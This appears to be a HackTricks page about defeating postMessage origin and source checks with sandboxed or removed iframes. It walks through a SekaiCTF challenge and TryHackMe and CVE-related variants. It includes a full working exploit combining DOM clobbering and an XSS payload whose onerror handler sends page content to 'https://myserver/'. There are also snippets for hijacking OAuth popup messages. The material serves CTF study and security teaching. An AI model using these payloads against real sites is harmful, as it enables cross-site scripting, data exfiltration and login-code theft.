# Bypassing SOP with Iframes - 2

{{#include ../../banners/hacktricks-training.md}}

## Iframes in SOP-2

In the [**solution**](https://github.com/project-sekai-ctf/sekaictf-2022/tree/main/web/obligatory-calc/solution) for this [**challenge**](https://github.com/project-sekai-ctf/sekaictf-2022/tree/main/web/obligatory-calc)**,** [**@Strellic\_**](https://twitter.com/Strellic_) proposes a similar method to the previous section. Let's check it.

In this challenge the attacker needs to **bypass** this:

```javascript
if (e.source == window.calc.contentWindow && e.data.token == window.token) {
```

If he does, he can send a **postmessage** with HTML content that is going to be written in the page with **`innerHTML`** without sanitation (**XSS**).

The way to bypass the **first check** is by making **`window.calc.contentWindow`** to **`undefined`** and **`e.source`** to **`null`**:

- **`window.calc.contentWindow`** is actually **`document.getElementById("calc")`**. You can clobber **`document.getElementById`** with **`<img name=getElementById />`** (note that Sanitizer API -[here](https://wicg.github.io/sanitizer-api/index.html#dom-clobbering)- is not configured to protect against DOM clobbering attacks in its default state).
  - Therefore, you can clobber **`document.getElementById("calc")`** with **`<img name=getElementById /><div id=calc></div>`**. Then, **`window.calc`** will be **`undefined`**.
  - Now, we need **`e.source`** to be **`undefined`** or **`null`** (because `==` is used instead of `===`, **`null == undefined`** is **`True`**). Getting this is "easy". If you create an **iframe** and **send** a **postMessage** from it and immediately **remove** the iframe, **`e.origin`** is going to be **`null`**. Check the following code

```javascript
let iframe = document.createElement("iframe")
document.body.appendChild(iframe)
window.target = window.open("http://localhost:8080/")
await new Promise((r) => setTimeout(r, 2000)) // wait for page to load
iframe.contentWindow.eval(`window.parent.target.postMessage("A", "*")`)
document.body.removeChild(iframe) //e.origin === null
```

In order to bypass the **second check** about token is by sending **`token`** with value `null` and making **`window.token`** value **`undefined`**:

- Sending `token` in the postMessage with value `null` is trivial.
- **`window.token`** in calling the function **`getCookie`** which uses **`document.cookie`**. Note that any access to **`document.cookie`** in **`null`** origin pages tigger an **error**. This will make **`window.token`** have **`undefined`** value.

The final solution by [**@terjanq**](https://twitter.com/terjanq) is the [**following**](https://gist.github.com/terjanq/0bc49a8ef52b0e896fca1ceb6ca6b00e#file-calc-html):

```html
<html>
  <body>
    <script>
      // Abuse "expr" param to cause a HTML injection and
      // clobber document.getElementById and make window.calc.contentWindow undefined
      open(
        'https://obligatory-calc.ctf.sekai.team/?expr="<form name=getElementById id=calc>"'
      )

      function start() {
        var ifr = document.createElement("iframe")
        // Create a sandboxed iframe, as sandboxed iframes will have origin null
        // this null origin will document.cookie trigger an error and window.token will be undefined
        ifr.sandbox = "allow-scripts allow-popups"
        ifr.srcdoc = `<script>(${hack})()<\/script>`

        document.body.appendChild(ifr)

        function hack() {
          var win = open("https://obligatory-calc.ctf.sekai.team")
          setTimeout(() => {
            parent.postMessage("remove", "*")
            // this bypasses the check if (e.source == window.calc.contentWindow && e.data.token == window.token), because
            // token=null equals to undefined and e.source will be null so null == undefined
            win.postMessage(
              {
                token: null,
                result:
                  "<img src onerror='location=`https://myserver/?t=${escape(window.results.innerHTML)}`'>",
              },
              "*"
            )
          }, 1000)
        }

        // this removes the iframe so e.source becomes null in postMessage event.
        onmessage = (e) => {
          if (e.data == "remove") document.body.innerHTML = ""
        }
      }
      setTimeout(start, 1000)
    </script>
  </body>
</html>
```

### 2025 Null-Origin Popups (TryHackMe - Vulnerable Codes)

A recent TryHackMe task (“Vulnerable Codes”) demonstrates how OAuth popups can be hijacked when the opener lives inside a sandboxed iframe that only allows scripts and popups. The iframe forces both itself and the popup into a `"null"` origin, so handlers checking `if (origin !== window.origin) return` silently fail because `window.origin` inside the popup is also `"null"`. Even though the browser still exposes the real `location.origin`, the victim never inspects it, so attacker-controlled messages glide through.

```javascript
const frame = document.createElement('iframe');
frame.sandbox = 'allow-scripts allow-popups';
frame.srcdoc = `
  <script>
    const pop = open('https://oauth.example/callback');
    pop.postMessage({ cmd: 'getLoginCode' }, '*');
  <\/script>`;
document.body.appendChild(frame);
```

Takeaways for abusing that setup:

- Handlers that compare `origin` with `window.origin` inside the popup can be bypassed because both evaluate to `"null"`, so forged messages look legitimate.
- Sandboxed iframes that grant `allow-popups` but omit `allow-same-origin` still spawn popups locked to the attacker-controlled null origin, giving you a stable enclave even in 2025 Chromium builds.

### Source-nullification & frame-restriction bypasses

Industry writeups around CVE-2024-49038 highlight two reusable primitives for this page: (1) you can still interact with pages that set `X-Frame-Options: DENY` by launching them via `window.open` and posting messages once the navigation settles, and (2) you can brute-force `event.source == victimFrame` checks by removing the iframe immediately after sending a message so that the receiver only sees `null` in the handler.

```javascript
const probe = document.createElement('iframe');
probe.sandbox = 'allow-scripts';
probe.onload = () => {
  const victim = open('https://target-app/');
  setTimeout(() => {
    probe.contentWindow.postMessage(payload, '*');
    probe.remove();
  }, 500);
};
document.body.appendChild(probe);
```

Combine this with the DOM-clobbering trick above: once the receiver only sees `event.source === null`, any comparison against `window.calc.contentWindow` or similar collapses, letting you ship malicious HTML sinks through `innerHTML` again.

## References
- [PostMessage Vulnerabilities: When Cross-Window Communication Goes Wrong](https://instatunnel.my/blog/postmessage-vulnerabilities-when-cross-window-communication-goes-wrong)
- [THM Write-up: Vulnerable Codes](https://fatsec.medium.com/thm-write-up-vulnerable-codes-9ea8fe8464f9)

{{#include ../../banners/hacktricks-training.md}}



